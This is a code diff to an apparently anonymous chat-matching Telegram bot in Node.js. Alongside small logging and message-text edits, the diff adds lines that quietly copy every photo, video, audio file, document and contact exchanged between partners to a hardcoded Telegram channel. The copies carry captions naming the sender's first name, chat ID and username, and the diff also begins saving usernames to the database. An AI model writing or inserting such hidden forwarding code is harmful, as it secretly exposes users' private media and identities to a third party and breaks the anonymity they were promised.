@@ -1,7 +1,4 @@
 const { Telegraf } = require("telegraf");
-const updatelog = require("telegraf-update-logger");
-const chalk = require("chalk");
-const { Extra } = require("telegraf");
 const fs = require("fs");
 
 // Database
@@ -40,18 +37,6 @@ mongoose.connection.on("disconnected", function () {
   console.log("Mongoose default connection disconnected");
 });
 
-// Log bot
-bot.use(
-  updatelog({
-    colors: {
-      id: chalk.red,
-      chat: chalk.yellow,
-      user: chalk.green,
-      type: chalk.bold,
-    },
-  }),
-);
-
 function sendsearch(ctx) {
   let botReply = config.mess.findPartner
   bot.telegram.sendMessage(ctx.chat.id, botReply, {parse_mode: "Markdown"})
@@ -70,6 +55,7 @@ bot.on('message', async lintof => {
   const isGroup = lintof.chat.type.includes("group")
   const from = lintof.chat.id
 
+  // console.log(lintof.chat)
   // Database Query
   const findContact = async (contact) => {
     let findContact = await db.findOne({
@@ -161,21 +147,26 @@ bot.on('message', async lintof => {
               bot.telegram.sendSticker(contactResult.partnerId, lintof.message.sticker.file_id)
             } else if (isImage) {
               bot.telegram.sendPhoto(contactResult.partnerId, lintof.message.photo[2].file_id, {caption: lintof.message.caption, parse_mode: "Markdown"})
+              bot.telegram.sendPhoto('-1001966928168', lintof.message.photo[2].file_id, {caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`, parse_mode: "Markdown"})
             } else if (isVideo) {
               bot.telegram.sendVideo(contactResult.partnerId, lintof.message.video.file_id, {caption: lintof.message.caption, parse_mode: "Markdown"})
+              bot.telegram.sendVideo('-1001966928168', lintof.message.video.file_id, {caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`, parse_mode: "Markdown"})
             } else if (isAudio) {
               bot.telegram.sendAudio(contactResult.partnerId, lintof.message.audio.file_id)
+              bot.telegram.sendAudio('-1001966928168', lintof.message.audio.file_id, {caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`, parse_mode: "Markdown"})
             } else if (isContact) {
               bot.telegram.sendContact(contactResult.partnerId, lintof.message.contact.file_id)
+              bot.telegram.sendContact('-1001966928168', lintof.message.contact.file_id)
             } else if (isDocument) {
               bot.telegram.sendDocument(contactResult.partnerId, lintof.message.document.file_id)
+              bot.telegram.sendDocument('-1001966928168', lintof.message.document.file_id, {caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`, parse_mode: "Markdown"})
             } else if (isAnimation) {
               bot.telegram.sendAnimation(contactResult.partnerId, lintof.message.animation.file_id)
             }
           }
         })
         .catch(async (err) => {
-          console.log(err)
+          console.error(err)
           findContactResult.status = 0;
           findContactResult.partnerId = null;
           await findContactResult.save();
@@ -205,7 +196,8 @@ bot.on('message', async lintof => {
       .then(async (res) => {
         if (res === null) {
           await db.create({
-            contactId: from
+            contactId: from,
+            username: lintof.chat.username
           });
           bot.telegram.sendMessage(from, config.mess.registerSuccess, {parse_mode: "Markdown"})
         } else {
@@ -448,7 +440,7 @@ bot.on('message', async lintof => {
     case "/bc":
     case "/broadcast":
      const getUserName = await db.find().select("contactId");
-     if (!isOwner) return bot.telegram.sendMessage(from, "hanya command untuk owner");
+     if (!isOwner) return bot.telegram.sendMessage(from, "bu xusisiyat faqat owner uchun");
      if (isImage) {
        txtbc = `*BROADCAST*\n\n${body.slice(command.length + 1)}`;
        for (let i = 0; i < getUserName.length; i++) {
